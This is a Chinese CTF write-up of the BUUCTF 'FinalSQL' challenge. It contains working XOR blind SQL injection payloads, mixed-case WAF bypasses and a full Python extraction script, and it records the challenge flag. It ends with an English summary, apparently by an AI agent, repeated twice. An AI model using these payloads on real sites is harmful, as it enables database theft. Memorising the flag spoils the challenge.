---
title: "[极客大挑战 2019]FinalSQL"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [sql-injection, blind-sqli, waf-bypass, xor-injection]
vulnerability: XOR-based盲注绕过关键字过滤
solved: true
flag: "flag{aa7c6b1c-53d8-406d-a74d-2b0533c36077}"
---

# [极客大挑战 2019]FinalSQL

## 题目概述
这是一道SQL盲注题目，通过XOR注入绕过WAF的关键字过滤，最终从数据库中提取flag。

## 信息收集
访问题目URL，发现页面包含：
1. `search.php?id=1-5` - 五个神秘代码按钮
2. `check.php` - 登录表单
3. 页面提示："我会php，PYTHON，mysql，SQL盲注"

测试发现：
- `id=1-5` 返回 "NO! Not this! Click others~~~"
- `id=6` 返回 "Clever! But not this table."
- `id=0` 或其他值返回 "ERROR！！！"
- 单引号触发错误，确认存在SQL注入

## 漏洞分析
**XOR盲注原理**：
- `id=1^(condition)` → condition为TRUE时：1^1=0 → ERROR
- `id=1^(condition)` → condition为FALSE时：1^0=1 → "NO! Not this!"

**WAF过滤关键字**：
- `or`, `and`, `select`, `union`, `from`, `where`, `database`, `flag`, `limit`, `if`, `case`, `regexp`, `like`, `version`, `mid` 等
- 但**大小写混合可绕过**：`SeLeCt` 不被过滤

**绕过方法**：
使用 `SeLeCt` 混合大小写，配合括号避免空格过滤

## 利用过程

**步骤1：确认注入点**
```bash
curl "http://target/search.php?id=1^(1=1)"   # ERROR (TRUE)
curl "http://target/search.php?id=1^(1=0)"   # NO! Not this! (FALSE)
```

**步骤2：提取数据库信息**
```python
# 使用二分法盲注
def check(condition):
    r = requests.get(URL, params={"id": f"1^({condition})"})
    return "ERROR" in r.text  # TRUE时返回ERROR

def extract_string(expr):
    # 二分法获取长度
    low, high = 0, 100
    while low < high:
        mid = (low + high) // 2
        if check(f"length(({expr}))>{mid}"):
            low = mid + 1
        else:
            high = mid
    length = low
    
    # 二分法逐字符提取
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if check(f"ascii(substr(({expr}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
    return result
```

**步骤3：获取表结构**
```sql
# 混合大小写绕过WAF
SeLeCt(group_concat(table_name))from(information_schema.tables)where(table_schema=database())
# 结果：F1naI1y,Flaaaaag

SeLeCt(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')
# 结果：id,username,password
```

**步骤4：提取flag**
```sql
SeLeCt(password)from(F1naI1y)where(username='flag')
# 结果：flag{aa7c6b1c-53d8-406d-a74d-2b0533c36077}
```

## 复现步骤
```python
#!/usr/bin/env python3
import requests
import time

URL = "http://target/search.php"
DELAY = 0.4

def check(condition):
    r = requests.get(URL, params={"id": f"1^({condition})"}, timeout=15)
    time.sleep(DELAY)
    return "ERROR" in r.text

def extract_string(expr):
    # 二分法获取长度
    low, high = 0, 100
    while low < high:
        mid = (low + high) // 2
        if check(f"length(({expr}))>{mid}"):
            low = mid + 1
        else:
            high = mid
    length = low
    
    # 二分法逐字符提取
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if check(f"ascii(substr(({expr}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"Progress: {result}")
    return result

# 提取flag
flag = extract_string("SeLeCt(password)from(F1naI1y)where(username='flag')")
print(f"FLAG: {flag}")
```

## 关键技术点
1. **XOR注入**：`id^(condition)` 构造布尔盲注
2. **大小写混合绕过**：`SeLeCt` 绕过 `select` 过滤
3. **括号替代空格**：`from(table)` 绕过空格过滤
4. **二分法优化**：每个字符只需7次请求而非128次
The background task has completed. I have successfully solved the challenge and extracted the flag `flag{aa7c6b1c-53d8-406d-a74d-2b0533c36077}`.

The key techniques used were:
1. **XOR-based blind SQL injection** - Using `id=1^(condition)` where TRUE→ERROR and FALSE→valid response
2. **Mixed case bypass** - `SeLeCt` bypasses the lowercase `select` filter
3. **Parentheses for space bypass** - `from(table)` instead of `from table`
4. **Binary search optimization** - 7 requests per character instead of 128
The background task has completed. I have successfully solved the challenge and extracted the flag `flag{aa7c6b1c-53d8-406d-a74d-2b0533c36077}`.

The key techniques used were:
1. **XOR-based blind SQL injection** - Using `id=1^(condition)` where TRUE→ERROR and FALSE→valid response
2. **Mixed case bypass** - `SeLeCt` bypasses the lowercase `select` filter
3. **Parentheses for space bypass** - `from(table)` instead of `from table`
4. **Binary search optimization** - 7 requests per character instead of 128
